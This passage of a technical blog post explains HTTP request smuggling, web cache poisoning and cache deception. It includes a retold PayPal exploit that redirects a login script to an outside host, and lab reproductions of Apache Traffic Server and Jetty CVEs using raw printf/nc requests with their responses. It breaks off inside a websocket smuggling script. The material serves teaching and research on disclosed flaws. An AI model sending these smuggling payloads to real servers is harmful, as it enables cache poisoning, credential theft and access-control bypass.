class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Innocent        Attacker          Front           Backend</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [*CP*]&lt;--B(200)----</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">--C---------------------------&gt;</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">&lt;--B(200)--------------------[HIT]             </span>|</span><br></pre></td></tr></table></figure><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>CP : Cache poisoning</li></ul><p>Similar to the previous flowchart, because <code>/resources/js/tracking.js</code> requested in C will be cached by Front as a static resource, and we use HTTP Smuggling to direct this request to our exploit server and return<code>alert(1)</code> to request C, and then this response packet will be cached by the Front server, so we have successfully poisoned.</p><h3 id="Perform-Web-Cache-Deception"><a href="#Perform-Web-Cache-Deception" class="headerlink" title="Perform Web Cache Deception"></a>Perform Web Cache Deception</h3><p>In fact, this scenario is similar to cache poisoning, but with a slight difference. According to more official statements, cache cheating and cache poisoning have the following differences.</p><blockquote><pre><code>What is the difference between web cache poisoning and web cache deception?- In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.- In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</code></pre></blockquote><p>This we do not cooperate with Lab. Because the environment provided by Lab maybe not work correctly.</p><p>But we can do like this to understand easily. We send the following HTTP request.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 43</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /private/messages HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></table></figure><p>The smuglling request will use <code>Foo: X</code> to hide the first line of the next request header sent, which is the line<code>GET /xxx HTTP/1.1</code>, and this request will be accessed with the user&#x2019;s cookie. Similar to a CSRF, the request becomes the following request header.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/private/messages</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /static/some-image.png HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br></pre></td></tr></table></figure><p>As long as we send more times, once the user accesses the static resource, it may be cached by the Front server, and we can get the information of the user <code>/private/messages</code>. There may be a lot of repeated packet sending here, because you need to construct a static resource cache, or you need some luck.</p><p>So far, the basic attack surface of HTTP Smuggling has been introduced.</p><h1 id="Real-World"><a href="#Real-World" class="headerlink" title="Real World"></a>Real World</h1><h2 id="Paypal"><a href="#Paypal" class="headerlink" title="Paypal"></a>Paypal</h2><p>First of all, I have to talk about the Paypal vulnerability instance shared by the author of HTTP Smuggling on Black Hat this year.</p><p>The author first poisoned a js file for Paypal login through HTTP Smuggling.</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 61 </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /webstatic HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: skeletonscribe.net?</span><br><span class="line"><span class="hljs-attribute">X</span>: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="hljs-number">302</span> Found</span><br><span class="line"><span class="hljs-attribute">Location</span>: http://skeletonscribe.net?, c.paypal.com/webstatic/</span><br></pre></td></tr></table></figure><p>But the Paypal login page has a CSP rule <code>script-src</code> which block this redirect.</p><p><img src="https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg" alt></p><p>Later, the author noticed that the login page loads a sub-page on c.paypal.com in a dynamically generated iframe. This sub-page didn&#x2019;t use CSP and also used a js file poisoned by the author! Although this can control the iframe page, because of the same-origin policy, the data of the parent page cannot be read.</p><p><img src="https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg" alt></p><p>His colleague then discovered a page at paypal.com/us/gifts that didn&#x2019;t use CSP, and also imported his poisoned JS file. By using his JS to redirect the c.paypal.com iframe to that URL (and triggering our JS import for the third time) he could finally access the parent and steal plaintext PayPal passwords from everyone who logged in using Safari or IE.</p><p><img src="https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg" alt></p><p>Paypal&#x2019;s first fix was to modify the Akamai configuration to reject requests containing <code>Transfer-Encoding: chunked</code>. But the author bypassed it quikly by constructing a newline header.</p><figure class="highlight fortran hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Transfer</span>-Encoding:</span><br><span class="line"> chunked</span><br></pre></td></tr></table></figure><h2 id="ATS"><a href="#ATS" class="headerlink" title="ATS"></a>ATS</h2><blockquote><p>&#x200B;    Apache Traffic Server (ATS) is an efficient, scalable HTTP proxy and cache server for the Apache Software Foundation.</p><p>There are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with Apache Traffic Server (ATS). This affects versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3.</p><p>In NVD, we can find four patches for this vulnerability, so let&#x2019;s take a closer look.</p><p>CVE-2018-8004 Patch list:</p><p><a href="https://github.com/apache/trafficserver/pull/3192" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3192</a></p><p><a href="https://github.com/apache/trafficserver/pull/3201" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3201</a> </p><p><a href="https://github.com/apache/trafficserver/pull/3231" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3231</a></p><p><a href="https://github.com/apache/trafficserver/pull/3251" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3251</a></p><p>Note: Although the vulnerability notification describes the scope of the vulnerability to version 7.1.3, from the version of the patch archive on github, most of the vulnerabilities have been fixed in version 7.1.3.</p></blockquote><p>About the analysis and recurrence of these four patches, I think @mengchen has already written very detailed, I will not repeat to talk about them. It is recommended to read the original part <a href="https://paper.seebug.org/1049/#4-http-smuggling-attack-examplecve-2018-8004" target="_blank" rel="noopener">HTTP Smuggling Attack Example&#x2014;&#x2014;CVE-2018-8004</a>.</p><p>Here we talk about the part that is not in the original text.</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[dummy-host7.example.com]</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                    +-[8080]-----+</span></span><br><span class="line"><span class="hljs-string">                    </span>|<span class="hljs-string"> 8007-&gt;8080 </span>|</span><br><span class="line">                    |<span class="hljs-string">  ATS7      </span>|</span><br><span class="line">                    |<span class="hljs-string">            </span>|</span><br><span class="line">                    +-----+------+</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                          </span>|</span><br><span class="line">                    +--[80]----+</span><br><span class="line">                    |<span class="hljs-string"> 8002-&gt;80 </span>|</span><br><span class="line">                    |<span class="hljs-string">  Nginx   </span>|</span><br><span class="line">                    |<span class="hljs-string">          </span>|</span><br><span class="line">                    +----------+</span><br></pre></td></tr></table></figure><p>We build the above scenario, and we can use the docker experimental environment I built. Here is <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/lab1" target="_blank" rel="noopener">lab1</a></p><h3 id="Request-Splitting-using-Huge-Header"><a href="#Request-Splitting-using-Huge-Header" class="headerlink" title="Request Splitting using Huge Header"></a>Request Splitting using Huge Header</h3><p>We can experiment by using a header of 65535 characters.For example, we can send a request which have got a header of 65535 characters to ATS 7 by using the following code.</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET_/something.html?zorg2=5_HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:_dummy-host7.example.com\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;X:_&quot;%65534s&quot;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">|tr <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&quot;1&quot;</span>\</span><br><span class="line">|tr <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-string">&quot; &quot;</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8007</span><br></pre></td></tr></table></figure><p>Nginx will directly return a 400 code error, but it is more interesting with ATS 7. We will get a 400 response and a 200 response from ATS 7.</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> Invalid HTTP Request</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: no-store</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Language</span>: en</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 220</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;TITLE&gt;Bad Request&lt;/TITLE&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BGCOLOR=&quot;white&quot; FGCOLOR=&quot;black&quot;&gt;</span><br><span class="line">&lt;H1&gt;Bad Request&lt;/H1&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line"></span><br><span class="line">&lt;FONT FACE=&quot;Helvetica,Arial&quot;&gt;&lt;B&gt;</span><br><span class="line"><span class="hljs-attribute">Description</span>: Could not process this request.</span><br><span class="line">&lt;/B&gt;&lt;/FONT&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br></pre></td></tr></table></figure><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 119</span><br><span class="line"><span class="hljs-attribute">Last-Modified</span>: Fri, 29 Nov 2019 05:37:09 GMT</span><br><span class="line"><span class="hljs-attribute">ETag</span>: &quot;5de0ae85-77&quot;</span><br><span class="line"><span class="hljs-attribute">X-Location-echo</span>: /index.html?replaced=0&amp;cache=8</span><br><span class="line"><span class="hljs-attribute">X-Default-VH</span>: 0</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: public, max-age=300</span><br><span class="line"><span class="hljs-attribute">Accept-Ranges</span>: bytes</span><br><span class="line"><span class="hljs-attribute">Age</span>: 0</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Nginx default static page&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;It works!&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h2><p>Jetty has three CVEs related to HTTP Smuggling.</p><ul><li><p>CVE-2017-7656 HTTP/0.9 issue</p><blockquote><pre><code>In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.</code></pre></blockquote></li><li><p>CVE-2017-7657  Chunk size attribute truncation</p><blockquote><pre><code>In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.</code></pre></blockquote></li><li><p>CVE-2017-7658 Double Content-Length</p><blockquote><pre><code>In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.</code></pre></blockquote></li></ul><p>For CVE-2017-7658, we will not explore it anymore, because as mentioned before, we mainly talk about the other two more interesting places.</p><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>Environment can still use what I built <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/jetty" target="_blank" rel="noopener">jetty lab enviroment</a>. Then we send a standard HTTP / 0.9 request as follows.</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET /?test=4564\r\n&apos;</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></table></figure><p>We will get a 400 code response.</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> HTTP/0.9 not supported</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html;charset=iso-8859-1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 65</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Server</span>: Jetty(9.4.9.v20180320)</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: HTTP/0.9 not supported&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>We add the version identifier.</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET /?test=4564 HTTP/0.9\r\n\r\n&apos;</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></table></figure><p>Although this is a format that is not supported by HTTP/0.9, there are unexpected gains, with a 200 response.</p><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Sample &quot;Hello, World&quot; Application<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">white</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>No headers, only body. This request was parsed by HTTP/0.9. </p><p>What&#x2019;s more interesting is that adding headers not supported by HTTP/0.9 will have unexpected results. Here we add a header that extracts the content of the response packet.</p><figure class="highlight tex hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf &apos;GET /?test=4564 HTTP/0.9<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>&apos;<span class="hljs-tag">\</span></span><br><span class="line">&apos;Range: bytes=36-42<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>&apos;<span class="hljs-tag">\</span></span><br><span class="line">&apos;<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>&apos;<span class="hljs-tag">\</span></span><br><span class="line">|nc -q 1 127.0.0.1 8994</span><br><span class="line"></span><br><span class="line">, World</span><br></pre></td></tr></table></figure><p>We will find that the body content has been extracted by us. Combined with the HTTP Response Splitting in HTTP Version part mentioned above, we can perform various fancy attacks.</p><h3 id="Chunk-size-attribute-truncation"><a href="#Chunk-size-attribute-truncation" class="headerlink" title="Chunk size attribute truncation"></a>Chunk size attribute truncation</h3><p>We send the request with the following code.</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;POST /?test=4973 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Type: application/x-www-form-urlencoded\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;100000000\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;POST /?test=4974 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Length: 5\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br></pre></td></tr></table></figure><p>Then we can get two 200 responses. But according to the standard of the chunk, although the second part looks like a request, it should actually be counted in the chunk data. The problem is here. Jetty returned two requests. 100000000 is treated as 0, which is the chunk end part, so there are two reasons for the request.</p><p>We can try more.</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;POST /?test=4975 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Type: application/x-www-form-urlencoded\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;1ff00000008\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;abcdefgh\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;POST /?test=4976 HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-Length: 5\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host: localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8994|grep <span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br></pre></td></tr></table></figure><p>Here we still get two 200 responses, that is, the first chunk size 1ff00000008 was truncated to 8 by jetty. The chunk data part only has <code>abcdefgh</code>, so two responses are returned.</p><p>Similar to Apache CVE-2015-3183, jetty will only take the last 8 bytes of chunk size:</p><figure class="highlight lsl hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffffffff00000000\r\n</span><br><span class="line">            ^^^^^^^^</span><br><span class="line">            <span class="hljs-number">00000000</span> =&gt; size <span class="hljs-number">0</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span>ff00000008\r\n</span><br><span class="line">   ^^^^^^^^</span><br><span class="line">   <span class="hljs-number">00000008</span> =&gt; size <span class="hljs-number">8</span></span><br></pre></td></tr></table></figure><h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>In fact, this part can be used as a separate part, but I think this article is so long, so we just talk about a brief introduction. In Hackactivity 2019,  @0ang3el proposed Websocket-related attack techniques <a href="Https://www.slideshare.net/0ang3el/whats-wrong-with-websocket- apis-unveiling-vulnerabilities-in-websocket-apis" target="_blank" rel="noopener">What&#x2019;s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs</a>, what interests me is the part of Websocket Smuggling. The author disclosure the relevant description in <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank" rel="noopener">websocket-smuggle</a>. </p><p>What is this attack surface? To sum up for you, when the connection is established in the websocket, if the reverse proxy does not fully comply with the RFC 6445 standard, the Sec-WebSocket-Version version is not handled properly. The connection between the client and the back-end server TCP/TLS won&#x2019;t be closed, so it cause an attack that we could conduct a smuglling request.</p><p>Here we assume that the solr service exists on the internal network and cannot be accessed from the external network. If websocket smuggling exists, we can write the following code to access the solr service.</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">req1 = <span class="hljs-string">&quot;&quot;&quot;GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: ip:port</span></span><br><span class="line"><span class="hljs-string">Sec-WebSocket-Version: 1338</span></span><br><span class="line"><span class="hljs-string">Upgrade: websocket</span></span><br><span 